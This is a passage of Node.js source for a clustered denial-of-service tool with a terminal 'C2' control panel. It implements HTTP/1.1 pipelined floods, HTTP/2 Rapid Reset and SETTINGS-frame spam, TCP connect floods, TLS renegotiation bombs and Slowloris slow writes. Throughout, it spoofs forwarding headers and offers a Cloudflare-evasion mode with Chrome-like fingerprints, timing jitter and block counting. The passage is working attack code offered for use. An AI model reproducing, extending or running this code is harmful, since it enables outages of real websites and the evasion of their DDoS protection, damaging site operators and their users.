            SLOW_KEEPALIVE_LINES[i] = `X-Keep-Alive-${crypto.randomBytes(2).toString('hex')}: ${Math.random()}\r\n`;
        }
    };
    rebuildSlowDrip();
    setInterval(rebuildSlowDrip, 5000);
    let slowDripIdx = 0;

    // HTTP/1.1 keep-alive pipeline pool
    function runH1Flood() {
        let activeSockets = 0;

        const startSocket = () => {
            if (activeSockets >= config.concurrency) return;
            activeSockets++;

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    activeSockets--;
                    setTimeout(startSocket, 100);
                    return;
                }

                connectionsEstablished++;
                socket.setKeepAlive(true, 60000);
                socket.setNoDelay(true);

                // CF block detection: peek first chunk of every response, scan for CF block markers
                if (config.bypassCf) {
                    socket.on('data', (chunk) => {
                        // Sample only the first 120 bytes to avoid per-byte cost on big responses
                        const sample = chunk.length > 120 ? chunk.slice(0, 120).toString('latin1') : chunk.toString('latin1');
                        if (CF_BLOCK_RE.test(sample)) cfBlocks++;
                    });
                }

                // Grab pre-built static fragment for this socket's profile
                const cachedProfile = H1_STATIC_PROFILE_CACHE[PROFILE_INDEX.get(profile) || 0];

                const sendBatch = () => {
                    if (socket.destroyed) return;

                    // ── Packet Coalescing ──────────────────────────────────
                    // cork() tells the kernel to buffer writes and flush them
                    // as a single syscall when uncork() fires — equivalent of
                    // TCP_CORK on Linux, works on macOS via libuv's write queue.
                    socket.cork();

                    // Use an array of parts and join once to avoid per-concat heap allocs
                    const parts = [];
                    const method = config.post ? 'POST' : 'GET';

                    const POOL_MASK = RAND_POOL_SIZE - 1;
                    if (config.bypassCf) {
                        // CF-coherent path: Chrome header order, no XFF/XRI tells, realistic refs/paths
                        for (let i = 0; i < config.rate; i++) {
                            const pi = randPoolIdx & POOL_MASK; randPoolIdx++;
                            const path = CF_PATH_POOL[pi];
                            const ref = CF_REF_POOL[randPoolIdx & POOL_MASK]; randPoolIdx++;

                            let req = `${method} ${path} HTTP/1.1\r\n`;
                            req += `Host: ${HOST}\r\n`;
                            req += `Connection: keep-alive\r\n`;
                            req += `Cache-Control: ${(pi & 1) ? 'no-cache' : 'max-age=0'}\r\n`;
                            req += cachedProfile.cfFragment;
                            req += `User-Agent: ${cachedProfile.ua}\r\n`;
                            if (ref) req += `Referer: ${ref}\r\n`;

                            if (config.cookie) req += `Cookie: ${config.cookie}\r\n`;

                            if (config.post) {
                                const payload = JSON.stringify({
                                    name: 'submit',
                                    value: RAND_REF_TOKENS[randPoolIdx & POOL_MASK]
                                });
                                randPoolIdx++;
                                req += `Content-Type: application/x-www-form-urlencoded\r\n`;
                                req += `Content-Length: ${Buffer.byteLength(payload)}\r\n\r\n`;
                                req += payload;
                            } else {
                                req += `\r\n`;
                            }

                            parts.push(req);
                            requestsSent++;
                        }
                    } else {
                        for (let i = 0; i < config.rate; i++) {
                            const pi = randPoolIdx & POOL_MASK; randPoolIdx++;
                            const [rp, rv] = RAND_PATH_TOKENS[pi];
                            const path = targetUrl.pathname +
                                (targetUrl.search || '') +
                                (targetUrl.search ? '&' : '?') + rp + '=' + rv;

                            const xff = RAND_IP_POOL[randPoolIdx & POOL_MASK]; randPoolIdx++;
                            const xri = RAND_IP_POOL[randPoolIdx & POOL_MASK]; randPoolIdx++;
                            const ref = RAND_REF_TOKENS[randPoolIdx & POOL_MASK]; randPoolIdx++;

                            let req = `${method} ${path} HTTP/1.1\r\n`;
                            req += `Host: ${HOST}\r\n`;
                            req += `User-Agent: ${cachedProfile.ua}\r\n`;
                            req += `X-Forwarded-For: ${xff}\r\n`;
                            req += `X-Real-IP: ${xri}\r\n`;
                            req += `Referer: https://www.google.com/search?q=${ref}\r\n`;
                            req += `Cache-Control: ${(pi & 1) ? 'no-cache' : 'max-age=0'}\r\n`;
                            req += cachedProfile.fragment;

                            if (config.cookie) req += `Cookie: ${config.cookie}\r\n`;

                            if (config.post) {
                                const payload = JSON.stringify({
                                    t: Date.now(),
                                    r: RAND_REF_TOKENS[randPoolIdx & POOL_MASK],
                                    data: RAND_REF_TOKENS[(randPoolIdx + 1) & POOL_MASK]
                                });
                                randPoolIdx += 2;
                                req += `Content-Type: application/json\r\n`;
                                req += `Content-Length: ${Buffer.byteLength(payload)}\r\n\r\n`;
                                req += payload;
                            } else {
                                req += `\r\n`;
                            }

                            parts.push(req);
                            requestsSent++;
                        }
                    }

                    const payload = parts.join('');
                    totalBytesSent += Buffer.byteLength(payload);
                    // Write string directly — Node converts to bytes in C++, skipping JS-side Buffer alloc
                    socket.write(payload);
                    socket.uncork();
                    // Backpressure: only schedule next batch when kernel is ready
                    const reschedule = () => {
                        if (config.bypassCf && config.cfJitter > 0) {
                            // Humanize timing: random delay in [0, cfJitter] ms between batches
                            setTimeout(sendBatch, Math.random() * config.cfJitter);
                        } else {
                            setImmediate(sendBatch);
                        }
                    };
                    if (!socket.writableNeedDrain) {
                        reschedule();
                    } else {
                        socket.once('drain', sendBatch);
                    }
                };

                sendBatch();

                socket.on('error', () => {
                    errorsCount++;
                    socket.destroy();
                });

                socket.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    activeSockets--;
                    setImmediate(startSocket);
                });
            });
        };

        for (let i = 0; i < config.concurrency; i++) {
            setTimeout(startSocket, i * 2);
        }
    }

    // HTTP/2 rapid reset and multiplexed get storm pool
    function runH2Flood() {
        let activeSessions = 0;

        const startH2Session = () => {
            if (activeSessions >= config.concurrency) return;
            activeSessions++;

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    activeSessions--;
                    setTimeout(startH2Session, 100);
                    return;
                }

                connectionsEstablished++;

                const client = http2.connect(config.target, {
                    createConnection: () => socket,
                    settings: config.bypassCf ? CF_H2_SETTINGS : {
                        initialWindowSize: 16777215,
                        maxFrameSize: 16384,
                        maxConcurrentStreams: 2000
                    }
                });

                client.on('error', () => {
                    errorsCount++;
                    client.destroy();
                    socket.destroy();
                });

                client.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    activeSessions--;
                    setTimeout(startH2Session, 20);
                });

                client.on('connect', () => {
                    const sendH2Burst = () => {
                        if (client.destroyed) return;

                        // ── Backpressure Gate ──────────────────────────────────
                        // 1. Don't overflow the server's declared stream limit.
                        const maxStreams = (client.remoteSettings &&
                            client.remoteSettings.maxConcurrentStreams) || 256;
                        // 2. Back off if our outbound frame queue is saturated.
                        const pendingFrames = (client.state && client.state.pendingFrames) || 0;
                        if (pendingFrames > 12000) {
                            // Queue is saturated — yield to event loop and retry
                            if (config.autoTune) {
                                config.rate = Math.max(1, Math.floor(config.rate * 0.90));
                            }
                            return setTimeout(sendH2Burst, 4);
                        }

                        // Clamp burst to what the server can actually accept
                        const burst = Math.min(config.rate, maxStreams);

                        for (let i = 0; i < burst; i++) {
                            // Pre-allocate headers without spread operator (faster)
                            const baseHeaders = H2_HEADER_POOL[h2PoolIndex & (H2_POOL_SIZE - 1)];
                            h2PoolIndex++;

                            let reqHeaders;
                            if (config.bypassCf) {
                                // CF-coherent: pool entry already has Client Hints, realistic refs, no XFF/XRI
                                reqHeaders = baseHeaders;
                            } else {
                                reqHeaders = {
                                    ':authority': baseHeaders[':authority'],
                                    ':scheme': baseHeaders[':scheme'],
                                    ':path': baseHeaders[':path'],
                                    ':method': baseHeaders[':method'],
                                    'user-agent': baseHeaders['user-agent'],
                                    'x-forwarded-for': baseHeaders['x-forwarded-for'],
                                    'x-real-ip': baseHeaders['x-real-ip'],
                                    'referer': baseHeaders['referer'],
                                    'cache-control': baseHeaders['cache-control']
                                };
                            }

                            let payload = null;
                            if (config.post) {
                                const pmask = RAND_POOL_SIZE - 1;
                                payload = JSON.stringify({
                                    t: Date.now(),
                                    r: RAND_REF_TOKENS[randPoolIdx & pmask],
                                    data: RAND_REF_TOKENS[(randPoolIdx + 1) & pmask]
                                });
                                randPoolIdx += 2;
                                reqHeaders['content-type'] = 'application/json';
                                reqHeaders['content-length'] = Buffer.byteLength(payload).toString();
                            }

                            const req = client.request(reqHeaders);
                            requestsSent++;

                            // CF block detection (when bypass mode is on) — fires before RST_STREAM races on rapid reset
                            if (config.bypassCf) {
                                req.on('response', (h) => {
                                    const status = h[':status'] | 0;
                                    if (status === 403 || status === 429 || status === 503 || h['cf-mitigated']) cfBlocks++;
                                });
                            }

                            // 75% Rapid Reset using lower 2 bits of pool index (0,1,2 = reset; 3 = keep) — zero-cost vs Math.random()
                            if ((h2PoolIndex & 3) !== 3) {
                                if (config.post && payload) req.write(payload);
                                req.close(http2.constants.NGHTTP2_CANCEL);
                            } else {
                                if (config.post && payload) req.write(payload);
                                req.end();
                                req.on('response', () => { req.close(); });
                            }

                            req.on('error', () => { errorsCount++; });
                        }

                        if (config.bypassCf && config.cfJitter > 0) {
                            // Humanize timing: random delay in [0, cfJitter] ms between bursts
                            setTimeout(sendH2Burst, Math.random() * config.cfJitter);
                        } else {
                            setImmediate(sendH2Burst);
                        }
                    };

                    sendH2Burst();
                });
            });
        };

        for (let i = 0; i < config.concurrency; i++) {
            setTimeout(startH2Session, i * 4);
        }
    }

    // TCP connect flood pool
    function runTCPFlood() {
        const activeSockets = new Set();

        const openSocket = () => {
            if (activeSockets.size >= config.concurrency) {
                const [old] = activeSockets;
                activeSockets.delete(old);
                if (old) old.destroy();
            }

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    return;
                }

                connectionsEstablished++;
                requestsSent++;

                const pidx = PROFILE_INDEX.get(profile) || 0;
                socket.write(TCP_PAYLOAD_CACHE[pidx]);
                totalBytesSent += TCP_PAYLOAD_BYTES[pidx];

                socket.on('error', () => { errorsCount++; });
                socket.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    activeSockets.delete(socket);
                });

                activeSockets.add(socket);
            });
        };

        const interval = setInterval(() => {
            for (let i = 0; i < 80; i++) openSocket();
        }, 20);

        process.on('SIGTERM', () => {
            clearInterval(interval);
            activeSockets.forEach(s => s.destroy());
        });
    }

    // TLS renegotiation spam
    function runTLSBomb() {
        if (!IS_SSL) {
            console.error('[-] TLS Renegotiation bomb requires an HTTPS target.');
            process.exit(1);
        }

        const activeTls = new Set();

        const createRenegotiation = () => {
            if (activeTls.size >= config.concurrency) {
                const [old] = activeTls;
                activeTls.delete(old);
                if (old) old.destroy();
            }

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    return;
                }

                connectionsEstablished++;
                requestsSent++;

                const loop = () => {
                    if (socket.destroyed) return;
                    try {
                        socket.renegotiate({ rejectUnauthorized: false }, (err) => {
                            if (!err) {
                                requestsSent++;
                                setTimeout(loop, 40);
                            }
                        });
                    } catch (_) {
                        errorsCount++;
                    }
                };

                loop();

                socket.on('error', () => { errorsCount++; });
                socket.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    activeTls.delete(socket);
                });

                activeTls.add(socket);
            });
        };

        const interval = setInterval(() => {
            for (let i = 0; i < 20; i++) createRenegotiation();
        }, 50);

        process.on('SIGTERM', () => {
            clearInterval(interval);
            activeTls.forEach(c => c.destroy());
        });
    }

    // Slowloris++ partial headers & slow POST write (Slow Write)
    function runSlowloris() {
        let activeSockets = 0;

        const openSlowSocket = () => {
            if (activeSockets >= config.concurrency) return;
            activeSockets++;

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    activeSockets--;
                    setTimeout(openSlowSocket, 100);
                    return;
                }

                connectionsEstablished++;
                socket.setNoDelay(true);

                const isPost = config.post || Math.random() < 0.5;
                const method = isPost ? 'POST' : 'GET';
                const headers = makeHeaders(profile, method);

                let initialPayload = `${method} ${headers[':path']} HTTP/1.1\r\n`;
                initialPayload += `Host: ${HOST}\r\n`;

                for (const [k, v] of Object.entries(headers)) {
                    if (k.startsWith(':')) continue;
                    initialPayload += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
                }

                if (isPost) {
                    const contentLen = 100000 + Math.floor(Math.random() * 100000);
                    initialPayload += `Content-Type: application/x-www-form-urlencoded\r\n`;
                    initialPayload += `Content-Length: ${contentLen}\r\n\r\n`;
                    socket.write(initialPayload);
                    requestsSent++;

                    const drip = setInterval(() => {
                        if (socket.destroyed) {
                            clearInterval(drip);
                            return;
                        }
                        socket.write(SLOW_DRIP_BUFS[slowDripIdx++ & (SLOW_DRIP_VARIANTS - 1)]);
                        requestsSent++;
                    }, 1000 + Math.random() * 1000);

                    socket.on('error', () => {
                        errorsCount++;
                        clearInterval(drip);
                    });

                    socket.on('close', () => {
                        connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                        activeSockets--;
                        clearInterval(drip);
                        setImmediate(openSlowSocket);
                    });
                } else {
                    socket.write(initialPayload);
                    requestsSent++;

                    const drip = setInterval(() => {
                        if (socket.destroyed) {
                            clearInterval(drip);
                            return;
                        }
                        socket.write(SLOW_KEEPALIVE_LINES[slowDripIdx++ & (SLOW_DRIP_VARIANTS - 1)]);
                        requestsSent++;
                    }, 2000 + Math.random() * 2000);

                    socket.on('error', () => {
                        errorsCount++;
                        clearInterval(drip);
                    });

                    socket.on('close', () => {
                        connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                        activeSockets--;
                        clearInterval(drip);
                        setImmediate(openSlowSocket);
                    });
                }
            });
        };

        for (let i = 0; i < config.concurrency; i++) {
            setTimeout(openSlowSocket, i * 20);
        }
    }

    // HTTP/2 SETTINGS frame spam (forces server processing without streams)
    function runH2Settings() {
        let activeSessions = 0;

        const startH2Session = () => {
            if (activeSessions >= config.concurrency) return;
            activeSessions++;

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    activeSessions--;
                    setTimeout(startH2Session, 100);
                    return;
                }

                connectionsEstablished++;

                const client = http2.connect(config.target, {
                    createConnection: () => socket,
                    settings: config.bypassCf ? CF_H2_SETTINGS : {
                        initialWindowSize: 16777215,
                        maxFrameSize: 16384,
                        maxConcurrentStreams: 2000
                    }
                });

                client.on('error', () => {
                    errorsCount++;
                    client.destroy();
                    socket.destroy();
                });

                client.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    activeSessions--;
                    setTimeout(startH2Session, 20);
                });

                client.on('connect', () => {
                    const spamSettings = () => {
                        if (client.destroyed) return;

                        // Hammer SETTINGS frames at max speed
                        for (let i = 0; i < config.rate; i++) {
                            try {
                                client.settings({
                                    headerTableSize: Math.floor(Math.random() * 4096) + 1024,
                                    enablePush: Math.random() < 0.5,
                                    maxConcurrentStreams: Math.floor(Math.random() * 1000) + 100,
                                    initialWindowSize: Math.floor(Math.random() * 65535) + 1024,
                                    maxFrameSize: Math.floor(Math.random() * 16384) + 16384,
                                    maxHeaderListSize: Math.floor(Math.random() * 8192) + 8192
                                }, (err) => {
                                    if (!err) requestsSent++;
                                    else errorsCount++;
                                });
                            } catch (_) {
                                errorsCount++;
                            }
                        }

                        setImmediate(spamSettings);
                    };

                    spamSettings();
                });
            });
        };

        for (let i = 0; i < config.concurrency; i++) {
            setTimeout(startH2Session, i * 4);
        }
    }

    switch (config.method) {
        case 'h1': runH1Flood(); break;
        case 'h2': runH2Flood(); break;
        case 'h2-settings': runH2Settings(); break;
        case 'tcp': runTCPFlood(); break;
        case 'tls': runTLSBomb(); break;
        case 'slow': runSlowloris(); break;
        default: process.exit(1);
    }
}

// ==========================================
// MASTER TERMINAL C2 INTERACTIVE PANEL
// ==========================================
if (cluster.isMaster) {
    let totalRequests = 0;
    let totalErrors = 0;
    let totalCfBlocks = 0;
    let totalCbTrips = 0;
    let reqPerSecond = 0;
    let mbpsSent = 0;

    let currentReqInSec = 0;
    let currentBytesInSec = 0;
    let currentCfBlocksInSec = 0;

    // Per-worker effective limits (after circuit breaker adjustments)
    const workerEffective = {}; // workerID -> { concurrency, rate }

    // Per-worker connection snapshot map (workerID -> last reported live connections)
    const workerConnections = {};
    let activeConnections = 0;

    // ── PID Autotune Controller ───────────────────────────────────────────
    // Measures true event-loop lag every second and adjusts config.rate
    // proportionally: P term reacts to current lag, I term corrects drift,
    // D term damps oscillation. Keeps the system at peak throughput without
    // saturating the CPU or the kernel write queue.
    let loopLagMs = 0;          // last measured lag (displayed on panel)
    let pidIntegral = 0;        // accumulated error (I term)
    let pidPrevError = 0;       // previous error for derivative (D term)
    const PID_TARGET_LAG = 2;   // ms — aggressive target (was 8, now hunting harder)
    const PID_KP = 0.12;        // proportional gain (was 0.04, 3x more aggressive)
    const PID_KI = 0.025;       // integral gain (was 0.008, 3x more aggressive)
    const PID_KD = 0.08;        // derivative gain (was 0.02, 4x more aggressive)
    let autoTuneDelta = 0;      // last rate adjustment (for panel display)

    // Measure event-loop lag with a self-scheduled timer
    let lastTick = Date.now();
    const measureLag = () => {
        const now = Date.now();
        loopLagMs = now - lastTick - 1000;
        lastTick = now;
        setTimeout(measureLag, 1000);
    };
    setTimeout(measureLag, 1000);

    // ── Local Network Safety Pre-Flight ────────────────────────────────────
    // Estimates total simultaneous outbound sockets and warns if it'll likely
    // exhaust ephemeral ports / NAT table on a home network.
    const totalSockets = config.concurrency * config.workers;
    const NAT_SAFE_LIMIT = 4000;   // typical home router NAT table size
    const EPHEMERAL_SAFE = 20000;  // Mac default ephemeral port range minus headroom
    if (totalSockets > NAT_SAFE_LIMIT) {
        console.warn(`\n\x1b[1;33m[!] WARNING: total sockets (${totalSockets}) exceeds typical home-router NAT table (~${NAT_SAFE_LIMIT}).\x1b[0m`);
        console.warn(`\x1b[1;33m    Your browser may lose connectivity during the run. Consider --preset medium or lower.\x1b[0m`);
    }
    if (totalSockets > EPHEMERAL_SAFE) {
        console.warn(`\n\x1b[1;31m[!] CRITICAL: total sockets (${totalSockets}) exceeds Mac's ephemeral port budget (~${EPHEMERAL_SAFE}).\x1b[0m`);
        console.warn(`\x1b[1;31m    Raise ulimit:  ulimit -n 65536    (and run this in the SAME terminal)\x1b[0m`);
        console.warn(`\x1b[1;31m    Or sysctl:     sudo sysctl -w net.inet.ip.portrange.first=1024\x1b[0m\n`);
    }
    try {
        // Show current ulimit hint
        const fdLimit = process.report ? (process.report.getReport().resourceLimits || {}).fileDescriptors : null;
        if (fdLimit && fdLimit.soft && fdLimit.soft < totalSockets / config.workers * 1.5) {
            console.warn(`\x1b[1;33m[!] Soft FD limit (${fdLimit.soft}) is tight for ${Math.ceil(totalSockets / config.workers)} sockets/worker.\x1b[0m`);
            console.warn(`\x1b[1;33m    Run:  ulimit -n 65536    before launching for full performance.\x1b[0m\n`);
        }
    } catch (_) { /* report API not available — skip */ }

    // Spawn cluster workers
    for (let i = 0; i < config.workers; i++) {
        const w = cluster.fork();
        // ── CPU Priority (P-Core Affinity) ────────────────────────────────
        // Elevate each worker to PRIORITY_HIGH so macOS scheduler favours
        // keeping threads on the fast P-cores instead of migrating to E-cores.
        // Cache lines stay warm, reducing clock-cycle penalty per context switch.
        w.process.on('spawn', () => {
            try {
                os.setPriority(w.process.pid, os.constants.priority.PRIORITY_HIGH);
            } catch (_) { /* requires elevated perms — fail silently */ }
        });
    }

    cluster.on('online', (worker) => {
        workerConnections[worker.id] = 0;
        // Attempt priority elevation once the process is confirmed online
        try {
            os.setPriority(worker.process.pid, os.constants.priority.PRIORITY_HIGH);
        } catch (_) { }
        worker.on('message', (msg) => {
            if (msg.type === 'metrics') {
                totalRequests += msg.requests;
                currentReqInSec += msg.requests;
                totalErrors += msg.errors;
                workerConnections[worker.id] = msg.connections;
                currentBytesInSec += msg.bytes;
                if (msg.cfBlocks) {
                    totalCfBlocks += msg.cfBlocks;
                    currentCfBlocksInSec += msg.cfBlocks;
                }
                if (msg.cbTrips !== undefined) {
                    // cbTrips is cumulative per-worker; take max-of-deltas approach by tracking last seen
                    workerEffective[worker.id] = {
                        concurrency: msg.effectiveConcurrency,
                        rate: msg.effectiveRate,
                        cbTrips: msg.cbTrips
                    };
                }
            }
        });
    });

    cluster.on('exit', (worker) => {
        delete workerConnections[worker.id];
        const w = cluster.fork();
        try { os.setPriority(w.process.pid, os.constants.priority.PRIORITY_HIGH); } catch (_) { }
    });

    // Graceful shutdown: propagate SIGINT/SIGTERM to workers and cleanup
    const shutdown = () => {
        log('Shutdown signal received, terminating workers...');
        for (const id in cluster.workers) {
            const worker = cluster.workers[id];
            if (worker) worker.process.kill('SIGTERM');
        }
        setTimeout(() => process.exit(0), 3000);
    };
    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);

    // Compile statistics + run PID autotune every second
    setInterval(() => {
        reqPerSecond = currentReqInSec;
        mbpsSent = ((currentBytesInSec * 8) / (1024 * 1024)).toFixed(2);
        activeConnections = Object.values(workerConnections).reduce((sum, n) => sum + n, 0);

        // PID controller — only active when autoTune is on
        if (config.autoTune) {
            const error = loopLagMs - PID_TARGET_LAG;   // +ve = too slow, -ve = headroom
            pidIntegral = Math.max(-500, Math.min(500, pidIntegral + error));
            const derivative = error - pidPrevError;
            pidPrevError = error;

            // Asymmetric gain: when system has headroom (error < 0), ramp UP 1.5× faster
            const gainMul = error < 0 ? 1.5 : 1.0;
            const adjustment = ((PID_KP * error) + (PID_KI * pidIntegral) + (PID_KD * derivative)) * gainMul;
            // Negative adjustment = lag too high, reduce rate
            // Positive adjustment = system has headroom, increase rate
            const newRate = Math.max(1, Math.round(config.rate - adjustment));
            autoTuneDelta = newRate - config.rate;
            config.rate = newRate;

            if (!global.peakRPS || currentReqInSec > global.peakRPS) {
                global.peakRPS = currentReqInSec;
            }
        }

        currentReqInSec = 0;
        currentBytesInSec = 0;
        currentCfBlocksInSec = 0;
    }, 1000);

    const startTime = Date.now();

    // Visual C2 console renderer using ANSI escape codes
    const printPanel = () => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const percentTime = Math.min(100, Math.floor((elapsed / config.duration) * 100));

        // Generate ASCII load bar
        const barWidth = 30;
        const filledWidth = Math.floor((percentTime / 100) * barWidth);
        const bar = '[' + '='.repeat(filledWidth) + ' '.repeat(barWidth - filledWidth) + ']';

        // Clear terminal screen and reset cursor position in-place
        process.stdout.write('\x1b[H\x1b[2J');

        process.stdout.write(`
\x1b[1;31m  ██████  ██  ██████  ███    ███  █████  
 ██       ██ ██       ████  ████ ██   ██ 
  █████   ██ ██   ███ ██ ████ ██ ███████ 
       ██ ██ ██    ██ ██  ██  ██ ██   ██ 
 ███████  ██  ██████  ██      ██ ██   ██ \x1b[0m
 ─────────────────────────────────────────────────────────────
 \x1b[1;37m[+] CONTROL PANEL: STATUS\x1b[0m
 ─────────────────────────────────────────────────────────────
 \x1b[1;36m[TARGET DETAILS]\x1b[0m
   Host        : ${HOST}
   Port        : ${PORT}
   Secure (SSL): ${IS_SSL ? 'YES' : 'NO'}
   URL Path    : ${targetUrl.pathname}

 \x1b[1;36m[CONFIG]\x1b[0m
   Method      : ${config.method.toUpperCase()}
   Mode        : ${config.post ? 'HTTP POST (Randomized payloads)' : 'HTTP GET'}
   CF Bypass   : ${config.bypassCf ? '\x1b[1;32mON (Chrome-coherent fingerprint)\x1b[0m' : '\x1b[0;37mOFF\x1b[0m'}
   Concurrency : ${config.concurrency} sockets/worker (Total: ${config.concurrency * config.workers})
   Workers     : ${config.workers} (Cluster processes)
   Rate factor : ${config.rate} req/burst
   Time Limit  : ${config.duration}s
   Status      : ${elapsed >= config.duration ? '\x1b[1;31mSHUTDOWN\x1b[0m' : '\x1b[1;32mATTACK RUNNING\x1b[0m'}

 \x1b[1;36m[TELEMETRY METRICS]\x1b[0m
   Active Conns: \x1b[1;32m${activeConnections.toLocaleString()}\x1b[0m
   Throughput  : \x1b[1;32m${mbpsSent} Mbps\x1b[0m
   Total Sent  : \x1b[1;33m${totalRequests.toLocaleString()}\x1b[0m
   Current RPS : \x1b[1;32m${reqPerSecond.toLocaleString()} req/s\x1b[0m
   Total Errors: \x1b[1;31m${totalErrors.toLocaleString()}\x1b[0m${config.bypassCf ? `
   CF Blocks   : \x1b[1;${totalCfBlocks > 0 ? '31' : '32'}m${totalCfBlocks.toLocaleString()} (${currentCfBlocksInSec}/s)\x1b[0m` : ''}
   Loop Lag    : \x1b[1;${loopLagMs > 20 ? '31' : loopLagMs > 8 ? '33' : '32'}m${loopLagMs.toFixed(1)} ms\x1b[0m
   PID Δ Rate  : \x1b[1;${autoTuneDelta < 0 ? '31' : autoTuneDelta > 0 ? '32' : '37'}m${autoTuneDelta >= 0 ? '+' : ''}${autoTuneDelta} r/burst\x1b[0m
   Circuit Brk : ${(() => {
                const tripsSum = Object.values(workerEffective).reduce((s, w) => s + (w.cbTrips || 0), 0);
                const effC = Object.values(workerEffective).reduce((s, w) => s + (w.concurrency || 0), 0);
                const effR = Object.values(workerEffective).length ? Math.round(Object.values(workerEffective).reduce((s, w) => s + (w.rate || 0), 0) / Object.values(workerEffective).length) : config.rate;
                const tripped = tripsSum > 0;
                return `\x1b[1;${tripped ? '33' : '32'}m${tripped ? 'TRIPPED ' + tripsSum + 'x' : 'OK'}\x1b[0m  effective: ${effC || (config.concurrency * config.workers)} conns / ${effR} rate`;
            })()}

 \x1b[1;36m[PROGRESS]\x1b[0m
   Elapsed Time: ${elapsed}s / ${config.duration}s ${bar} (${percentTime}%)
 ─────────────────────────────────────────────────────────────
 \x1b[0;37mKeep Console Window Open. Press Ctrl+C to force abort.\x1b[0m
`);
    };

    // Frame update scheduler
    const panelInterval = setInterval(printPanel, 500);

    // Watch duration limit
    setTimeout(() => {
        clearInterval(panelInterval);
        console.log('\n\n[+] Time limit reached. Terminating simulation bots...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill('SIGTERM');
        }
        console.log('[+] Done. All worker bots disconnected.');
        process.exit(0);
    }, config.duration * 1000);
}
